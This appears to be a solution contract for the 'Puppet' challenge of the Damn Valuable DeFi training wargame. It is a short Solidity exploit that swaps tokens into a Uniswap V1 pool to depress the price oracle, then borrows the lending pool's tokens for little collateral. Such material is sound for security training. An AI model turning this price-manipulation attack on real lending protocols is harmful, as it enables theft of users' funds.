// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./PuppetPool.sol";
import "hardhat/console.sol";
import "./IUniswapV1Exchange.sol";

contract PuppetAttack {
    using Address for address;

    PuppetPool public pool;
    IUniswapV1Exchange public exchange;
    DamnValuableToken public token;

    constructor(address _pool, address _exchange) {
        pool = PuppetPool(_pool);
        exchange = IUniswapV1Exchange(_exchange);
        token = pool.token();
    }

    function attack(address player) public payable {
        // Exchange all the tokens to ETH
        token.approve(address(exchange), type(uint256).max);
        exchange.tokenToEthSwapInput(token.balanceOf(address(this)), 1, block.timestamp * 2);
        uint256 collateral = pool.calculateDepositRequired(100000 ether);
        pool.borrow{value: collateral}(100000 ether, player);
    }

    receive() external payable {}
}
